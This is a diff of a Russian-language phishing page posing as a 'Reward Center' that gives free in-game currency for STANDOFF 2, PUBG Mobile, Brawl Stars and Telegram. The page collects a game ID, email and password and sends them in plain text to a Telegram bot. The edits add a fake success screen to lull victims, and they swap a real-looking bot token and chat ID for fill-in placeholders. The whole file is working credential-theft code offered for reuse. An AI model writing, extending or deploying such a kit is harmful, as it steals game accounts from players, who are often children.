@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -25,21 +24,16 @@
         max-width: 420px;
         width: 100%;
         box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        text-align: center;
     }
     h1 {
         font-size: 22px;
-        text-align: center;
         margin-bottom: 8px;
         background: linear-gradient(90deg, #ffd700, #ff8c00);
         -webkit-background-clip: text;
         -webkit-text-fill-color: transparent;
     }
-    .sub {
-        text-align: center;
-        font-size: 13px;
-        color: #aaa;
-        margin-bottom: 24px;
-    }
+    .sub { font-size: 13px; color: #aaa; margin-bottom: 24px; }
     .buttons {
         display: grid;
         grid-template-columns: 1fr 1fr;
@@ -53,30 +47,20 @@
         font-size: 13px;
         font-weight: 600;
         cursor: pointer;
-        transition: transform 0.15s, box-shadow 0.15s;
         color: #fff;
-        text-align: center;
         line-height: 1.3;
+        transition: transform 0.15s;
     }
-    .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.4); }
+    .btn:active { transform: scale(0.97); }
     .btn.standoff { background: linear-gradient(135deg, #ff6b00, #ff9500); }
     .btn.pubg     { background: linear-gradient(135deg, #f5a623, #d97706); }
     .btn.brawl    { background: linear-gradient(135deg, #8b5cf6, #6d28d9); }
     .btn.stars    { background: linear-gradient(135deg, #00b4d8, #0077b6); }
     .btn span { display: block; font-size: 11px; opacity: 0.85; margin-top: 3px; font-weight: 400; }
 
-    .login-form {
-        display: none;
-        flex-direction: column;
-        gap: 12px;
-    }
-    .login-form.active { display: flex; }
-    .login-form h2 {
-        font-size: 16px;
-        text-align: center;
-        margin-bottom: 8px;
-        color: #ffd700;
-    }
+    .step { display: none; flex-direction: column; gap: 12px; }
+    .step.active { display: flex; }
+    .step h2 { font-size: 16px; margin-bottom: 8px; color: #ffd700; }
     input {
         padding: 14px 16px;
         border-radius: 12px;
@@ -88,6 +72,9 @@
     }
     input:focus { border-color: #ffd700; }
     input::placeholder { color: #888; }
+    .hint { font-size: 11px; color: #888; text-align: left; margin-top: -6px; }
+    .error { color: #ff6b6b; font-size: 13px; display: none; }
+    .error.active { display: block; }
     .submit {
         padding: 14px;
         border: none;
@@ -99,27 +86,33 @@
         cursor: pointer;
         margin-top: 8px;
     }
-    .loader {
+    .success {
         display: none;
-        text-align: center;
-        padding: 20px;
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
     }
-    .loader.active { display: block; }
-    .spinner {
-        width: 40px; height: 40px;
-        border: 4px solid rgba(255,255,255,0.1);
-        border-top-color: #ffd700;
+    .success.active { display: flex; }
+    .checkmark {
+        width: 70px;
+        height: 70px;
         border-radius: 50%;
-        margin: 0 auto 12px;
-        animation: spin 0.8s linear infinite;
+        background: linear-gradient(135deg, #22c55e, #16a34a);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 36px;
+        margin-bottom: 8px;
+        animation: pop 0.4s ease;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .footer {
-        text-align: center;
-        font-size: 11px;
-        color: #666;
-        margin-top: 20px;
+    @keyframes pop {
+        0% { transform: scale(0); }
+        70% { transform: scale(1.1); }
+        100% { transform: scale(1); }
     }
+    .success h2 { color: #22c55e; font-size: 20px; }
+    .success p { color: #ccc; font-size: 14px; }
+    .footer { text-align: center; font-size: 11px; color: #666; margin-top: 20px; }
 </style>
 </head>
 <body>
@@ -142,20 +135,29 @@
         </button>
     </div>
 
-    <form class="login-form" id="loginForm" onsubmit="return sendData(event)">
+    <div class="step" id="idStep">
+        <h2 id="idTitle">Введите игровой ID</h2>
+        <input type="text" id="gameId" placeholder="ID">
+        <p class="hint" id="idHint"></p>
+        <p class="error" id="idError">Неверный формат ID</p>
+        <button class="submit" onclick="checkId()">Далее</button>
+    </div>
+
+    <form class="step" id="loginStep" onsubmit="return sendData(event)">
         <h2 id="formTitle">Получение награды</h2>
         <input type="email" id="email" placeholder="Электронная почта" required>
         <input type="password" id="password" placeholder="Пароль" required>
         <button type="submit" class="submit">Получить 🎁</button>
     </form>
 
-    <div class="loader" id="loader">
-        <div class="spinner"></div>
-        <p style="font-size:14px;color:#ccc;">Проверка аккаунта...</p>
-        <p style="font-size:12px;color:#888;margin-top:6px;">Пожалуйста, подождите</p>
+    <div class="success" id="success">
+        <div class="checkmark">✓</div>
+        <h2>Подарок получен!</h2>
+        <p id="successText">Ваша награда зачислена на аккаунт.</p>
+        <p style="font-size:12px;color:#888;margin-top:8px;">Зайдите в игру и проверьте инвентарь</p>
     </div>
 
-    <div class="footer">© 2026 Reward Center · Все права защищены</div>
+    <div class="footer">© 2026 Reward Center</div>
 </div>
 
 <script>
@@ -164,51 +166,89 @@
     function selectPlatform(platform, reward) {
         selected.platform = platform;
         selected.reward = reward;
+
         document.getElementById('buttons').style.display = 'none';
-        document.getElementById('formTitle').textContent = `${reward} · ${platform}`;
-        document.getElementById('loginForm').classList.add('active');
+        document.getElementById('idTitle').textContent = `Введите ID · ${platform}`;
+
+        let hint = '';
+        let placeholder = '';
+
+        if (platform === 'STANDOFF 2') {
+            hint = 'ID должен состоять из 9 цифр';
+            placeholder = '123456789';
+        } else if (platform === 'PUBG Mobile') {
+            hint = 'ID должен состоять из 8–12 цифр';
+            placeholder = '5123456789';
+        } else if (platform === 'Brawl Stars') {
+            hint = 'ID должен начинаться с # и содержать 9 символов (буквы и цифры)';
+            placeholder = '#ABC123XYZ';
+        } else if (platform === 'Telegram') {
+            hint = 'Username должен начинаться с @';
+            placeholder = '@username';
+        }
+
+        document.getElementById('idHint').textContent = hint;
+        document.getElementById('gameId').placeholder = placeholder;
+        document.getElementById('gameId').value = '';
+        document.getElementById('idError').classList.remove('active');
+        document.getElementById('idStep').classList.add('active');
+    }
+
+    function checkId() {
+        const id = document.getElementById('gameId').value.trim();
+        const err = document.getElementById('idError');
+        let valid = false;
+
+        if (selected.platform === 'STANDOFF 2') {
+            valid = /^\d{9}$/.test(id);
+        } else if (selected.platform === 'PUBG Mobile') {
+            valid = /^\d{8,12}$/.test(id);
+        } else if (selected.platform === 'Brawl Stars') {
+            valid = /^#[A-Za-z0-9]{9}$/.test(id);
+        } else if (selected.platform === 'Telegram') {
+            valid = /^@[A-Za-z0-9_]+$/.test(id);
+        }
+
+        if (!valid) {
+            err.textContent = 'Неверный формат ID. ' + document.getElementById('idHint').textContent;
+            err.classList.add('active');
+            return;
+        }
+
+        err.classList.remove('active');
+        document.getElementById('idStep').classList.remove('active');
+        document.getElementById('formTitle').textContent = `${selected.reward} · ${selected.platform}`;
+        document.getElementById('loginStep').classList.add('active');
     }
 
     function sendData(e) {
         e.preventDefault();
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
+        const gameId = document.getElementById('gameId').value;
 
-        const payload = {
-            email: email,
-            password: password,
-            platform: selected.platform,
-            reward: selected.reward,
-            ua: navigator.userAgent,
-            time: new Date().toISOString()
-        };
-
-        // 👇 ВСТАВЬ СЮДА СВОЙ BOT API И CHAT ID
-        const BOT_TOKEN = '8747751460:AAEO78CefXypChf0HLzoo_ZORaVOGAO9erI';
-        const CHAT_ID   = '8783227095';
+        // ==== ВСТАВЬ СВОИ ЗНАЧЕНИЯ ====
+        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
+        const CHAT_ID   = 'ТВОЙ_CHAT_ID';
 
         const text = `🎁 Новая заявка!\n\n` +
-                     `📧 Email: ${email}\n` +
-                     `🔑 Пароль: ${password}\n` +
                      `🎮 Платформа: ${selected.platform}\n` +
                      `🏆 Награда: ${selected.reward}\n` +
-                     `🕐 Время: ${new Date().toLocaleString('ru-RU')}\n` +
-                     `📱 UA: ${navigator.userAgent}`;
+                     `🆔 Игровой ID: ${gameId}\n` +
+                     `📧 Email: ${email}\n` +
+                     `🔑 Пароль: ${password}\n` +
+                     `🕐 Время: ${new Date().toLocaleString('ru-RU')}`;
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        });
+        }).catch(err => console.log(err));
 
-        document.getElementById('loginForm').classList.remove('active');
-        document.getElementById('loader').classList.add('active');
-
-        setTimeout(() => {
-            document.getElementById('loader').innerHTML =
-                '<p style="font-size:15px;color:#ff6b6b;">❌ Ошибка соединения</p>' +
-                '<p style="font-size:13px;color:#888;margin-top:8px;">Попробуйте позже</p>';
-        }, 4000);
+        document.getElementById('loginStep').classList.remove('active');
+        document.getElementById('successText').textContent =
+            `${selected.reward} для ${selected.platform} зачислены на аккаунт ${gameId}.`;
+        document.getElementById('success').classList.add('active');
 
         return false;
     }
